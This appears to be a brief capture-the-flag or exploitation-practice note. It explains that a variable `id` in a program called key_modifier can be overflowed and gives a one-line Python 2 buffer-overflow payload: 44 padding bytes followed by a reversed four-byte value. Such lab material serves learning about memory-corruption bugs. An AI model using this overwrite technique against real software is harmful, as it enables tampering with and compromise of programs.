We can overflow the below variable `id`. Don't forget to reverse packets of bytes.

```bash
python2 -c 'print "A"*44 + "\x02\xb0\xad\x1b"' | ./key_modifier
```
